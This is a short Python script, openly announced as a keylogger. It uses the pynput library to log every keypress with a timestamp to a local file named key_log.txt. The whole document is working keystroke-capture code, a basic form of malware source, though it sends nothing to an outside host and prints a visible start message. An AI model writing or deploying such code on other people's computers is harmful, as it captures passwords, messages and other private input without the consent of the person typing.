from pynput.keyboard import Key,Listener
import logging

print(" KEYLOGGER PROGRAM STARTS...")
log=""
logging.basicConfig(filename = (log + "key_log.txt"), level =logging.DEBUG, format = '%(asctime)s : %(message)s')

def on_press(key):
    logging.info(key)

with Listener(on_press = on_press) as listener:
    listener.join()


